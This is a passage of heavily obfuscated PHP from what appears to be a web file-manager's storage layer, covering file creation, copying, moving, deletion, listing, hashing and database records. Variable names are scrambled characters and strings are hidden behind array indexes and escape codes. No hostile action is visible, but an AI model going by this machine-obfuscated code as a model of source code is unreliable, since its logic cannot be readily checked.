$_SERVER[ĞÆÏ¡Îª]; global $config; return $this->iconvTo($°áóëá, $config[$¿ì¹¦æ[1355]], $config[$¿ì¹¦æ[1356]]); } public function getPathOuter($¬–äêœ) { $æÃ­­»× =& $_SERVER[ĞÆÏ¡Îª]; $õ’úÑ¥¿ = $this->iconvApp($this->pathBase); $¬–äêœ = $this->iconvApp($¬–äêœ); if (substr($õ’úÑ¥¿, 0, 2) == $æÃ­­»×[1358]) { $õ’úÑ¥¿ = BASIC_PATH . substr($õ’úÑ¥¿, 2); } if (substr($¬–äêœ, 0, 2) == $æÃ­­»×[1358]) { $¬–äêœ = BASIC_PATH . substr($¬–äêœ, 2); } $õ’úÑ¥¿ = KodIO::clear($õ’úÑ¥¿); $¬–äêœ = KodIO::clear($¬–äêœ); $¬–äêœ = substr($¬–äêœ, strlen($õ’úÑ¥¿)); if (empty($this->pathDriver)) { return $¬–äêœ; } return $this->pathDriver . $æÃ­­»×[8] . ltrim($¬–äêœ, $æÃ­­»×[8]); } public function mkfile($…“¢ìŠ, $úø©”Ì = '', $¨ÆÉòíß = REPEAT_RENAME) { $…“¢ìŠ = $this->iconvSystem($…“¢ìŠ); @touch($…“¢ìŠ); if ($úø©”Ì) { file_put_contents($…“¢ìŠ, $úø©”Ì); } @chmod($…“¢ìŠ, $this->pathAuth); return is_file($…“¢ìŠ) ? $this->getPathOuter($…“¢ìŠ) : !1; } public function mkdir($ÖØ‡š–†, $ò¬‚£ôù = REPEAT_SKIP) { $ÖØ‡š–† = $this->iconvSystem($ÖØ‡š–†); if (is_dir($ÖØ‡š–†)) { return $this->getPathOuter($ÖØ‡š–†); } @mkdir($ÖØ‡š–†, $this->pathAuth, !0); @chmod($ÖØ‡š–†, $this->pathAuth); return is_dir($ÖØ‡š–†) ? $this->getPathOuter($ÖØ‡š–†) : !1; } public function copyFile($ÏÃ—ò «, $¨¢Èæ¨÷) { $this->mkdir($this->pathFather($¨¢Èæ¨÷)); $ÏÃ—ò « = $this->iconvSystem($ÏÃ—ò «); $¨¢Èæ¨÷ = $this->iconvSystem($¨¢Èæ¨÷); $•æÅèİƒ = copy_64($ÏÃ—ò «, $¨¢Èæ¨÷); @chmod($¨¢Èæ¨÷, $this->pathAuth); return $•æÅèİƒ ? $this->getPathOuter($¨¢Èæ¨÷) : !1; } public function moveFile($´¬‚úç, $İ—Ò¼Æ¾) { $this->mkdir($this->pathFather($İ—Ò¼Æ¾)); $´¬‚úç = $this->iconvSystem($´¬‚úç); $İ—Ò¼Æ¾ = $this->iconvSystem($İ—Ò¼Æ¾); $Œõ¾²²ˆ = intval(@rename($´¬‚úç, $İ—Ò¼Æ¾)); if (!$Œõ¾²²ˆ) { if ($Œõ¾²²ˆ = intval(@copy_64($´¬‚úç, $İ—Ò¼Æ¾))) { @unlink($´¬‚úç); } } @chmod($İ—Ò¼Æ¾, $this->pathAuth); return $Œõ¾²²ˆ ? $this->getPathOuter($İ—Ò¼Æ¾) : !1; } public function movePath($ëÏì±™, $Ñ¾ø¸çÓ, $†Èô ãß = false) { $ñ„®®§ =& $_SERVER[ĞÆÏ¡Îª]; $ëÏì±™ = $this->iconvSystem($ëÏì±™); $Ñ¾ø¸çÓ = $this->iconvSystem($Ñ¾ø¸çÓ); $¼šÒØÓ = rtrim($Ñ¾ø¸çÓ, $ñ„®®§[8]) . $ñ„®®§[8] . ($†Èô ãß ? $†Èô ãß : get_path_this($ëÏì±™)); if (file_exists($¼šÒØÓ)) { return !1; } $Ô›’Ø¨ = intval(@rename($ëÏì±™, $¼šÒØÓ)); $Ô›’Ø¨ = file_exists($¼šÒØÓ); return $Ô›’Ø¨ ? $this->getPathOuter($¼šÒØÓ) : !1; } public function delFile($ş¹”‡Ìò) { $ş¹”‡Ìò = $this->iconvSystem($ş¹”‡Ìò); if (!@unlink($ş¹”‡Ìò)) { @chmod($ş¹”‡Ìò, $this->pathAuth); if (!@unlink($ş¹”‡Ìò)) { return !1; } } else { return !0; } } public function delFolder($ÄÀ«ÕŸÃ) { $—Ó‹íì© =& $_SERVER[ĞÆÏ¡Îª]; $ÄÀ«ÕŸÃ = $this->iconvSystem($ÄÀ«ÕŸÃ); if (!is_dir($ÄÀ«ÕŸÃ)) { return !0; } if (!($õĞ±—§— = opendir($ÄÀ«ÕŸÃ))) { return !1; } while (($´£Èª•å = readdir($õĞ±—§—)) !== !1) { if ($´£Èª•å == $—Ó‹íì©[10] || $´£Èª•å == $—Ó‹íì©[1365]) { continue; } $ÍÜÚ×¨– = $ÄÀ«ÕŸÃ . $—Ó‹íì©[8] . $´£Èª•å; if (is_file($ÍÜÚ×¨–) || is_link($ÍÜÚ×¨–)) { if (!unlink($ÍÜÚ×¨–)) { chmod($ÍÜÚ×¨–, $this->pathAuth); if (!unlink($ÍÜÚ×¨–)) { return !1; } } } else { if (is_dir($ÍÜÚ×¨–)) { chmod($ÍÜÚ×¨–, $this->pathAuth); $ÍÜÚ×¨– = $this->iconvApp($ÍÜÚ×¨–); if (!$this->delFolder($ÍÜÚ×¨–)) { return !1; } } } } closedir($õĞ±—§—); return rmdir($ÄÀ«ÕŸÃ); } public function rename($÷ÍÜö»’, $ÂÊª‰š¼) { $åÇŸäÉ =& $_SERVER[ĞÆÏ¡Îª]; $ú®ÄÈÍº = $this->fileNameAuto($this->pathFather($÷ÍÜö»’), $ÂÊª‰š¼); $ú®ÄÈÍº = $this->iconvSystem($ú®ÄÈÍº); $÷ÍÜö»’ = $this->iconvSystem($÷ÍÜö»’); $Îóßà·Ÿ = $this->pathFather($÷ÍÜö»’); $­‘çÇõÒ = rtrim($Îóßà·Ÿ, $åÇŸäÉ[8]) . $åÇŸäÉ[8] . $ú®ÄÈÍº; $ş£şÄ™  = @rename($÷ÍÜö»’, $­‘çÇõÒ); $­‘çÇõÒ = $this->iconvApp($­‘çÇõÒ); return $ş£şÄ™  ? $this->getPathOuter($­‘çÇõÒ) : !1; } public function size($…ü‰š¥’) { $…ü‰š¥’ = $this->iconvSystem($…ü‰š¥’); return filesize_64($…ü‰š¥’); } public function info($™Æ–°Ãò) { $™Æ–°Ãò = $this->iconvSystem($™Æ–°Ãò); if ($this->isFolder($™Æ–°Ãò)) { return $this->folderInfo($™Æ–°Ãò); } else { if ($this->isFile($™Æ–°Ãò)) { return $this->fileInfo($™Æ–°Ãò); } } return !1; } protected function infoChildren($Ò÷¥µª», &$ñ‚’¼°, $ÈãŸº…† = true) { $—ƒ‡¢Ü =& $_SERVER[ĞÆÏ¡Îª]; check_abort_echo(); $Ò÷¥µª» = rtrim($Ò÷¥µª», $—ƒ‡¢Ü[8]) . $—ƒ‡¢Ü[8]; if ($ÈãŸº…†) { $Ò÷¥µª» = $this->iconvSystem($Ò÷¥µª»); } if (!($½ßÖ¬ìÊ = @opendir($Ò÷¥µª»))) { return; } while (($ÃÜÄş²¢ = readdir($½ßÖ¬ìÊ)) !== !1) { if ($ÃÜÄş²¢ == $—ƒ‡¢Ü[10] || $ÃÜÄş²¢ == $—ƒ‡¢Ü[1365]) { continue; } $ÊáÓ¤‚¦ = $Ò÷¥µª» . $ÃÜÄş²¢; if (is_file($ÊáÓ¤‚¦) || is_link($ÊáÓ¤‚¦)) { $ñ‚’¼°[$—ƒ‡¢Ü[77]]++; $ñ‚’¼°[$—ƒ‡¢Ü[76]] += filesize_64($ÊáÓ¤‚¦); } else { if (is_dir($ÊáÓ¤‚¦)) { $ñ‚’¼°[$—ƒ‡¢Ü[78]]++; $this->infoChildren($ÊáÓ¤‚¦, $ñ‚’¼°, !1); } } } closedir($½ßÖ¬ìÊ); } private function folderInfo($ÓÍ“Öëë, $‚·ÖáÒÊ = false) { $Ûï¾ñŸ =& $_SERVER[ĞÆÏ¡Îª]; $ÓÍ“Öëë = rtrim($ÓÍ“Öëë, $Ûï¾ñŸ[8]) . $Ûï¾ñŸ[8]; $ÌËÓšûø = $this->iconvApp($this->pathThis($ÓÍ“Öëë)); if ($‚·ÖáÒÊ) { return array($Ûï¾ñŸ[32] => $ÌËÓšûø, $Ûï¾ñŸ[84] => $this->getPathOuter($ÓÍ“Öëë), $Ûï¾ñŸ[33] => $Ûï¾ñŸ[75]); } $øÄû™é = array($Ûï¾ñŸ[32] => $ÌËÓšûø, $Ûï¾ñŸ[84] => $this->getPathOuter($ÓÍ“Öëë), $Ûï¾ñŸ[33] => $Ûï¾ñŸ[75], $Ûï¾ñŸ[200] => @filectime($ÓÍ“Öëë), $Ûï¾ñŸ[85] => @filemtime($ÓÍ“Öëë), $Ûï¾ñŸ[1368] => @fileatime($ÓÍ“Öëë), $Ûï¾ñŸ[1369] => is_readable($ÓÍ“Öëë), $Ûï¾ñŸ[1370] => is_writable($ÓÍ“Öëë), $Ûï¾ñŸ[1371] => get_mode($ÓÍ“Öëë)); return $øÄû™é; } private function fileInfo($Ş÷¹âÈ¹, $åÎ‚àªÑ = false) { $ã²¢é•Ó =& $_SERVER[ĞÆÏ¡Îª]; $à÷Â—úÚ = $this->iconvApp($this->pathThis($Ş÷¹âÈ¹)); if ($åÎ‚àªÑ) { return array($ã²¢é•Ó[32] => $à÷Â—úÚ, $ã²¢é•Ó[84] => $this->getPathOuter($Ş÷¹âÈ¹), $ã²¢é•Ó[33] => $ã²¢é•Ó[199], $ã²¢é•Ó[76] => $this->size($Ş÷¹âÈ¹), $ã²¢é•Ó[174] => $this->ext($à÷Â—úÚ)); } $ÒêÅÁœÌ = array($ã²¢é•Ó[32] => $à÷Â—úÚ, $ã²¢é•Ó[84] => $this->getPathOuter($Ş÷¹âÈ¹), $ã²¢é•Ó[33] => $ã²¢é•Ó[199], $ã²¢é•Ó[200] => @filectime($Ş÷¹âÈ¹), $ã²¢é•Ó[85] => @filemtime($Ş÷¹âÈ¹), $ã²¢é•Ó[1368] => @fileatime($Ş÷¹âÈ¹), $ã²¢é•Ó[76] => $this->size($Ş÷¹âÈ¹), $ã²¢é•Ó[174] => $this->ext($à÷Â—úÚ), $ã²¢é•Ó[1369] => is_readable($Ş÷¹âÈ¹), $ã²¢é•Ó[1370] => is_writable($Ş÷¹âÈ¹), $ã²¢é•Ó[1371] => get_mode($Ş÷¹âÈ¹)); return $ÒêÅÁœÌ; } public function exist($Î­õÔòª) { $Î­õÔòª = $this->iconvSystem($Î­õÔòª); return @file_exists($Î­õÔòª); } public function isFile($ïëùĞ“×) { $ïëùĞ“× = $this->iconvSystem($ïëùĞ“×); return @is_file($ïëùĞ“×); } public function isFolder($õÁÛ±¯á) { $õÁÛ±¯á = $this->iconvSystem($õÁÛ±¯á); return @is_dir($õÁÛ±¯á); } public function listPath($î›Ë£­ù, $áœù¾ë¶ = false) { $…–Çó¨Ú =& $_SERVER[ĞÆÏ¡Îª]; $î›Ë£­ù = $this->iconvSystem($î›Ë£­ù); $î›Ë£­ù = rtrim($î›Ë£­ù, $…–Çó¨Ú[8]) . $…–Çó¨Ú[8]; $ò”¯Î‡— = array($…–Çó¨Ú[82] => array(), $…–Çó¨Ú[83] => array()); if (!($”ŠĞ÷ûö = @opendir($î›Ë£­ù))) { return $ò”¯Î‡—; } while (($ôàˆ÷¢Â = readdir($”ŠĞ÷ûö)) !== !1) { if ($ôàˆ÷¢Â == $…–Çó¨Ú[10] || $ôàˆ÷¢Â == $…–Çó¨Ú[1365]) { continue; } $Ñ·ìÍŠ = $î›Ë£­ù . $ôàˆ÷¢Â; if (is_file($Ñ·ìÍŠ)) { $ò”¯Î‡—[$…–Çó¨Ú[83]][] = $this->fileInfo($Ñ·ìÍŠ, $áœù¾ë¶); } else { $ò”¯Î‡—[$…–Çó¨Ú[82]][] = $this->folderInfo($Ñ·ìÍŠ, $áœù¾ë¶); } } closedir($”ŠĞ÷ûö); return $ò”¯Î‡—; } public function listAll($¬ì³Òˆ, &$ÚËç½ˆ = array()) { $­Ş×´ı =& $_SERVER[ĞÆÏ¡Îª]; $¬ì³Òˆ = $this->iconvSystem($¬ì³Òˆ); $¬ì³Òˆ = rtrim($¬ì³Òˆ, $­Ş×´ı[8]) . $­Ş×´ı[8]; if (!($Š¥×³Šƒ = @opendir($¬ì³Òˆ))) { return $ÚËç½ˆ; } while (($’°¹áÍ = readdir($Š¥×³Šƒ)) !== !1) { if ($’°¹áÍ == $­Ş×´ı[10] || $’°¹áÍ == $­Ş×´ı[1365]) { continue; } $å§Š½ğÒ = $¬ì³Òˆ . $’°¹áÍ; if (is_dir($å§Š½ğÒ) && !is_link($å§Š½ğÒ)) { $ÚËç½ˆ[] = array($­Ş×´ı[84] => $å§Š½ğÒ . $­Ş×´ı[8], $­Ş×´ı[75] => 1, $­Ş×´ı[85] => @filemtime($å§Š½ğÒ), $­Ş×´ı[76] => 0); $this->listAll($å§Š½ğÒ, $ÚËç½ˆ); } else { $ÚËç½ˆ[] = array($­Ş×´ı[84] => $å§Š½ğÒ, $­Ş×´ı[75] => 0, $­Ş×´ı[85] => @filemtime($å§Š½ğÒ), $­Ş×´ı[76] => $this->size($å§Š½ğÒ)); } } closedir($Š¥×³Šƒ); return $ÚËç½ˆ; } public function has($£Ä¸˜·, $Ó¤´Å»¦ = false, $º™˜‡ Ù = true) { $–êâí =& $_SERVER[ĞÆÏ¡Îª]; $£Ä¸˜· = $this->iconvSystem($£Ä¸˜·); $£Ä¸˜· = rtrim($£Ä¸˜·, $–êâí[8]) . $–êâí[8]; if (!($¸È­Î‡Ø = @opendir($£Ä¸˜·))) { return !1; } $‚ãòš¸Â = 0; $å¬“¡‚Ç = 0; $ÂÖäƒ¶Ó = 0; while (($­Œºƒëè = readdir($¸È­Î‡Ø)) !== !1) { if ($­Œºƒëè == $–êâí[10] || $­Œºƒëè == $–êâí[1365]) { continue; } $å¥šâãä = $£Ä¸˜· . $­Œºƒëè; if ($Ó¤´Å»¦) { $ÂÖäƒ¶Ó++; if (@is_file($å¥šâãä)) { $‚ãòš¸Â++; } else { $å¬“¡‚Ç++; } if ($ÂÖäƒ¶Ó > 10000) { break; } continue; } if ($º™˜‡ Ù) { if (@is_file($å¥šâãä)) { return !0; } } else { if (@is_dir($å¥šâãä . $–êâí[8])) { return !0; } } } closedir($¸È­Î‡Ø); if ($Ó¤´Å»¦) { return array($–êâí[207] => $‚ãòš¸Â, $–êâí[208] => $å¬“¡‚Ç); } return !1; } public function hashSimple($İËÌ÷Äº) { $³üŞå»õ =& $_SERVER[ĞÆÏ¡Îª]; if (!$İËÌ÷Äº) { return md5($³üŞå»õ[12]); } $İËÌ÷Äº = $this->iconvSystem($İËÌ÷Äº); $Çï´íÙ© = $this->size($İËÌ÷Äº); $¥¤ •é’ = 200; $ÈÕ©³’« = 50; if ($Çï´íÙ© <= $¥¤ •é’ * $ÈÕ©³’«) { return $this->hashMd5($İËÌ÷Äº) . $Çï´íÙ©; } $¯õ€¤ = $³üŞå»õ[12]; $Õ†–Ø· = intval($Çï´íÙ© / $ÈÕ©³’«); $†È´×èˆ = fopen($İËÌ÷Äº, $³üŞå»õ[1372]); if (!$†È´×èˆ) { return $¯õ€¤; } for ($üúê©á = 0; $üúê©á < $ÈÕ©³’«; $üúê©á++) { fseek_64($†È´×èˆ, $Õ†–Ø· * $üúê©á); $¯õ€¤ .= fread($†È´×èˆ, $¥¤ •é’); } fseek_64($†È´×èˆ, $Çï´íÙ© - $¥¤ •é’); $¯õ€¤ .= fread($†È´×èˆ, $¥¤ •é’); fclose($†È´×èˆ); return md5($¯õ€¤) . $Çï´íÙ©; } public function getContent($½‘¯ı‰Ë) { $½‘¯ı‰Ë = $this->iconvSystem($½‘¯ı‰Ë); return file_get_contents($½‘¯ı‰Ë); } public function setContent($¤¶×áÑˆ, $ä§×Úë = '') { $¤¶×áÑˆ = $this->iconvSystem($¤¶×áÑˆ); $ñÒ‹†éÈ = @file_put_contents($¤¶×áÑˆ, $ä§×Úë, LOCK_EX); clearstatcache(); @chmod($¤¶×áÑˆ, $this->pathAuth); return $ñÒ‹†éÈ === !1 ? !1 : !0; } public function fileSubstr($î‡“ë¢Œ, $ˆËç˜Ã = 0, $¸‚Æº”Ê = false) { $€‡•Éœ— =& $_SERVER[ĞÆÏ¡Îª]; $î‡“ë¢Œ = $this->iconvSystem($î‡“ë¢Œ); if ($¸‚Æº”Ê === !1) { $¸‚Æº”Ê = $this->size($î‡“ë¢Œ); } if ($¸‚Æº”Ê <= 0) { return $€‡•Éœ—[12]; } $”ÖÊº‚¥ = fopen($î‡“ë¢Œ, $€‡•Éœ—[1372]); if (!$”ÖÊº‚¥) { return !1; } fseek_64($”ÖÊº‚¥, $ˆËç˜Ã); $Ôö‡ÂèŠ = fread($”ÖÊº‚¥, $¸‚Æº”Ê); fclose($”ÖÊº‚¥); return $Ôö‡ÂèŠ; } public function upload($Ÿï¶ÓùØ, $è»¶Ô…¸, $‹ô½ñ‚Ö = false, $Óø¬âĞğ = REPEAT_REPLACE) { if ($‹ô½ñ‚Ö) { return $this->moveFile($è»¶Ô…¸, $Ÿï¶ÓùØ); } return $this->copyFile($è»¶Ô…¸, $Ÿï¶ÓùØ); } public function setModifyTime($ª¥ôü”‰, $Æ†²³‘ = '') { @touch($ª¥ôü”‰, intval($Æ†²³‘)); } public function download($ı§ó“Œ, $ö»æ¯€ñ) { return $this->iconvSystem($ı§ó“Œ); } } goto C±Î¡‚óëÜ; cîËÜ÷öõ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\154\145\x5f\143\157\156\x74\145\x6e\164\163"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\151\155\x65", "\x74\151\155\x65", "\x69\x6e\163\145\162\x74", "\146\x75\156\x63\164\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\155\x65" => "\x69\x6f\x5f\x66\151\154\145\x5f\155\145\x74\141", "\x6d\145\164\141\106\151\145\154\x64" => "\x66\151\x6c\145\111\x44"); public function fileInfo($àŸò±š) { $ââ’›†Ë =& $_SERVER[ĞÆÏ¡Îª]; static $Ç´°¯éÙ = array(); if (!isset($Ç´°¯éÙ[$àŸò±š])) { $µÇòÏ‡Ä = $ââ’›†Ë[1868]; $¼ä‘“† = Model($ââ’›†Ë[480])->field($µÇòÏ‡Ä)->where(array($ââ’›†Ë[478] => $àŸò±š))->find(); $Ç´°¯éÙ[$àŸò±š] = $¼ä‘“†; } return $Ç´°¯éÙ[$àŸò±š]; } public function addFileByContent($¢¬øÍï = '', $Ş½¿‡™ = '') { $ØÜë½€º =& $_SERVER[ĞÆÏ¡Îª]; $Í‡›¥¤ú = TEMP_PATH . $ØÜë½€º[1869]; if (!is_dir($Í‡›¥¤ú)) { mk_dir($Í‡›¥¤ú); } $»ÓíÏÂŠ = $Í‡›¥¤ú . $ØÜë½€º[1870] . rand_string(16); file_put_contents($»ÓíÏÂŠ, $¢¬øÍï); $ÌÖ²ëß» = $this->addFile($»ÓíÏÂŠ, $Ş½¿‡™, !0); if (file_exists($»ÓíÏÂŠ)) { @unlink($»ÓíÏÂŠ); } return $ÌÖ²ëß»; } public function createFileName($ÚÍñõ, $é¹º“äª = false, $½«©‹´— = false) { $ ä¬ßëá =& $_SERVER[ĞÆÏ¡Îª]; $˜Â•Âğ¶ = IO::init($ ä¬ßëá[8]); $”À¹¨ÖÂ = $this->makeFilePath($ÚÍñõ, $˜Â•Âğ¶, $é¹º“äª, $½«©‹´—); $Æı‹©§È = $˜Â•Âğ¶->pathFather($”À¹¨ÖÂ); static $£’·şäŞ = false; $ˆ—£Ã°õ = $ ä¬ßëá[1871] . md5($Æı‹©§È); if (!$£’·şäŞ && !Cache::get($ˆ—£Ã°õ)) { $£’·şäŞ = !0; $Ÿ¹¥×çª = IO::mkdir($Æı‹©§È); if (!IO::exist($Ÿ¹¥×çª . $ ä¬ßëá[792])) { IO::mkfile($Ÿ¹¥×çª . $ ä¬ßëá[792]); } Cache::set($ˆ—£Ã°õ, 1, 3600 * 2); } return $”À¹¨ÖÂ; } public function makeFilePath($ŞïÔâ£Ñ, $úÜæ®Àó, $§ÈÛ€ß¨ = false, $á””­Êà = false) { $ä©§ÈÊƒ =& $_SERVER[ĞÆÏ¡Îª]; $—¤¼…² = Model($ä©§ÈÊƒ[765])->get($ä©§ÈÊƒ[1872]); $«¿áŠéÎ = KodIO::defaultIO() . date($ä©§ÈÊƒ[1873]); $…ÖßÑ” = $«¿áŠéÎ . rand_string(5) . short_id(100); $ŞïÔâ£Ñ = str_replace($ä©§ÈÊƒ[8], $ä©§ÈÊƒ[11], KodIO::clear($ŞïÔâ£Ñ)); $Î’æ—÷¦ = $úÜæ®Àó->ext($ŞïÔâ£Ñ); if (!$ŞïÔâ£Ñ) { $—¤¼…² = $ä©§ÈÊƒ[1874]; } switch ($—¤¼…²) { case $ä©§ÈÊƒ[1875]: $…ÖßÑ” = $…ÖßÑ” . $ä©§ÈÊƒ[10] . $úÜæ®Àó->ext($ŞïÔâ£Ñ); if ($Î’æ—÷¦ == $ä©§ÈÊƒ[1812]) { $…ÖßÑ” .= $ä©§ÈÊƒ[1542]; } break; case $ä©§ÈÊƒ[1876]: $’Ú’İï‚ = Model($ä©§ÈÊƒ[765])->get($ä©§ÈÊƒ[766]); $“Èíê¡ = substr(md5($ä©§ÈÊƒ[767] . $’Ú’İï‚ . date($ä©§ÈÊƒ[743])), 0, 8); $˜°½´¦ = KodIO::defaultDriver(); $«¿áŠéÎ = $ä©§ÈÊƒ[1220] . $˜°½´¦[$ä©§ÈÊƒ[407]] . $ä©§ÈÊƒ[418] . date($ä©§ÈÊƒ[1877]) . $“Èíê¡ . $ä©§ÈÊƒ[8]; if ($Î’æ—÷¦ == $ä©§ÈÊƒ[1812]) { $ŞïÔâ£Ñ .= $ä©§ÈÊƒ[1542]; } $„‘ÌÔú¡ = $ä©§ÈÊƒ[1878] . $«¿áŠéÎ . $ŞïÔâ£Ñ; CacheLock::lock($„‘ÌÔú¡); $…ÖßÑ” = $«¿áŠéÎ . $ŞïÔâ£Ñ; if (IO::exist($«¿áŠéÎ . $ŞïÔâ£Ñ)) { $Ö½Á¨é‡ = substr($ŞïÔâ£Ñ, 0, strlen($ŞïÔâ£Ñ) - strlen($Î’æ—÷¦)); $¦ğÅ¢êü = $á””­Êà ? substr($á””­Êà, 0, 5) : ($§ÈÛ€ß¨ ? substr($§ÈÛ€ß¨, 0, 5) : rand_string(5)); $…ÖßÑ” = $«¿áŠéÎ . $Ö½Á¨é‡ . $¦ğÅ¢êü . $ä©§ÈÊƒ[10] . $Î’æ—÷¦; } if (IO::isTypeObject($…ÖßÑ”) && !IO::isUploadServer($…ÖßÑ”)) { if (IO::exist($…ÖßÑ”)) { return $…ÖßÑ”; } $î—¾òşæ = IO::setContent($…ÖßÑ”, $ä©§ÈÊƒ[12]); if (!$î—¾òşæ) { show_json($ä©§ÈÊƒ[1879], !1); } } CacheLock::unlock($„‘ÌÔú¡); break; case $ä©§ÈÊƒ[1874]: break; default: break; } return $…ÖßÑ”; } public function addFileByRemote($ë‡÷×­ó, $ù‚¤ğ«î, $òÏ­×½ = array()) { $—ŒÙÛ =& $_SERVER[ĞÆÏ¡Îª]; if (!IO::exist($ë‡÷×­ó)) { return !1; } $æÓ¯­‡À = $òÏ­×½[$—ŒÙÛ[176]] ? $òÏ­×½[$—ŒÙÛ[176]] : $—ŒÙÛ[12]; $¸‹ÔÕŠ = IO::hashMd5($ë‡÷×­ó, $æÓ¯­‡À); $¥Â‚ß = KodIO::defaultDriver(); $ÊİØ—Ó­ = array($—ŒÙÛ[594] => IO::size($ë‡÷×­ó), $—ŒÙÛ[1880] => 1, $—ŒÙÛ[429] => $ù‚¤ğ«î, $—ŒÙÛ[803] => $¥Â‚ß[$—ŒÙÛ[407]], $—ŒÙÛ[430] => $ë‡÷×­ó, $—ŒÙÛ[1881] => $òÏ­×½[$—ŒÙÛ[177]] ? $òÏ­×½[$—ŒÙÛ[177]] : IO::hashSimple($ë‡÷×­ó), $—ŒÙÛ[1882] => $¸‹ÔÕŠ ? $¸‹ÔÕŠ : $æÓ¯­‡À); if ($İ¼Â°ÃÄ = $this->addFileCheckExist($ÊİØ—Ó­[$—ŒÙÛ[177]], $ÊİØ—Ó­[$—ŒÙÛ[176]], $ÊİØ—Ó­[$—ŒÙÛ[76]])) { return $İ¼Â°ÃÄ; } return $this->addFileData($ÊİØ—Ó­); } private function addFileData($·Ì¾õî£) { $®Ú¡Ú±ö =& $_SERVER[ĞÆÏ¡Îª]; if (!$·Ì¾õî£) { return !1; } $·Ì¾õî£[$®Ú¡Ú±ö[76]] = intval($·Ì¾õî£[$®Ú¡Ú±ö[76]]); if (!$·Ì¾õî£[$®Ú¡Ú±ö[76]] && strlen($·Ì¾õî£[$®Ú¡Ú±ö[177]]) > 32) { $·Ì¾õî£[$®Ú¡Ú±ö[76]] = intval(substr($·Ì¾õî£[$®Ú¡Ú±ö[177]], 32)); } $°×Ô”µ = $this->add($·Ì¾õî£); return $this->find($°×Ô”µ); } public function addFile($×³ü™üô, $ú´ã‚€, $»¡£öã› = false) { $ÕÎÄÃ¡û =& $_SERVER[ĞÆÏ¡Îª]; $Œ£ëã‘ = IO::hashSimple($×³ü™üô); $ÎÓêã‹ = IO::size($×³ü™üô); $Ô€¼äšå = $ÎÓêã‹ <= 1024 * 1024 * 10 ? IO::hashMd5($×³ü™üô) : $ÕÎÄÃ¡û[12]; $¬×ˆê›÷ = $ÕÎÄÃ¡û[1883] . $Œ£ëã‘; CacheLock::lock($¬×ˆê›÷); if ($Ô€¼äšå && $Œ£ëã‘) { $ø‚“„ûä = $this->addFileCheckExist($Œ£ëã‘, $Ô€¼äšå, $ÎÓêã‹); if ($ø‚“„ûä) { CacheLock::unlock($¬×ˆê›÷); return $ø‚“„ûä; } } $÷¸ë­ = $this->addFileMake($×³ü™üô, $ÎÓêã‹, $Œ£ëã‘, $Ô€¼äšå, $ú´ã‚€, $»¡£öã›); $»ĞâÄ¦ = $this->addFileData($÷¸ë­); CacheLock::unlock($¬×ˆê›÷); if (!$Ô€¼äšå && $»ĞâÄ¦) { $this->fileMd5Check($»ĞâÄ¦); } return $»ĞâÄ¦; } private function fileMd5Check($‰¯¡‘ÑÃ) { $‹„•ĞÖŸ =& $_SERVER[ĞÆÏ¡Îª]; $¨šıá’ = array($‰¯¡‘ÑÃ[$‹„•ĞÖŸ[477]], $‰¯¡‘ÑÃ[$‹„•ĞÖŸ[84]]); $©ı¤ƒğ = $‹„•ĞÖŸ[1884] . $‰¯¡‘ÑÃ[$‹„•ĞÖŸ[84]]; $™ê£Õ¼ı = $‹„•ĞÖŸ[1885] . $‰¯¡‘ÑÃ[$‹„•ĞÖŸ[477]]; $ãÓÄŒ÷ò = TaskQueue::add($‹„•ĞÖŸ[1886], $¨šıá’, $©ı¤ƒğ, $™ê£Õ¼ı); if (!$ãÓÄŒ÷ò) { $this->fileMd5Set($‰¯¡‘ÑÃ[$‹„•ĞÖŸ[477]], $‰¯¡‘ÑÃ[$‹„•ĞÖŸ[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Óó¶ºñï, $Æ“¨ÆÖğ) { $ç¥®È›İ =& $_SERVER[ĞÆÏ¡Îª]; $ŞâÕ¦î = $this->find($Óó¶ºñï); if (!$ŞâÕ¦î || $ŞâÕ¦î[$ç¥®È›İ[176]]) { return; } $ÖŞíçÈ¹ = IO::hashMd5($Æ“¨ÆÖğ); if (!$ÖŞíçÈ¹) { return $ç¥®È›İ[12]; } $this->where(array($ç¥®È›İ[477] => $Óó¶ºñï))->save(array($ç¥®È›İ[176] => $ÖŞíçÈ¹)); } public function addFileMake($Ã¹«æ‰¬, $¦Íî ©‹, $ü®ÔÁÙ¾, $¢œÄ¾ÒĞ, $àÍºª İ, $Œß°æº›) { $öÑœŠãı =& $_SERVER[ĞÆÏ¡Îª]; $¼û§«œÓ = $this->createFileName($àÍºª İ, $ü®ÔÁÙ¾, $¢œÄ¾ÒĞ); $ò¾“îÙ = get_path_father($¼û§«œÓ); $ €æÙø÷ = get_path_this($¼û§«œÓ); if ($Œß°æº›) { $­™ÙÏÄ¹ = IO::move($Ã¹«æ‰¬, $ò¾“îÙ, !1, $ €æÙø÷); } else { $­™ÙÏÄ¹ = IO::copy($Ã¹«æ‰¬, $ò¾“îÙ, !1, $ €æÙø÷); } if (!$­™ÙÏÄ¹) { return !1; } $ îåî—í = KodIO::defaultDriver(); $¯¡ä“ß = array($öÑœŠãı[594] => $¦Íî ©‹, $öÑœŠãı[1880] => 1, $öÑœŠãı[429] => $àÍºª İ, $öÑœŠãı[803] => $ îåî—í[$öÑœŠãı[407]], $öÑœŠãı[430] => $¼û§«œÓ, $öÑœŠãı[1881] => $ü®ÔÁÙ¾, $öÑœŠãı[1882] => $¢œÄ¾ÒĞ); return $¯¡ä“ß; } public function addFileCheckExist($Å¦Â°‘ã, $Šô¼¤’, $ø‰Ùô„) { $„›Ù˜–ˆ =& $_SERVER[ĞÆÏ¡Îª]; $¨€ªÑ± = $this->findByHash($Å¦Â°‘ã, $Šô¼¤’); if (!$¨€ªÑ±) { return !1; } $ı›ŞÓ¶ = array($„›Ù˜–ˆ[1880] => intval($¨€ªÑ±[$„›Ù˜–ˆ[1887]]) + 1, $„›Ù˜–ˆ[594] => $ø‰Ùô„); $this->where(array($„›Ù˜–ˆ[478] => $¨€ªÑ±[$„›Ù˜–ˆ[477]]))->save($ı›ŞÓ¶); return $¨€ªÑ±; } public function remove($”›ÒÉé) { $this->linkCountChange($”›ÒÉé, !1); $this->clearEmpty(); return !0; } public function linkAdd($‘±ÀÅ§İ) { $this->linkCountChange($‘±ÀÅ§İ, !0); } public function linkCountChange($şª›‘®¬, $©ÈÆ‰«î) { 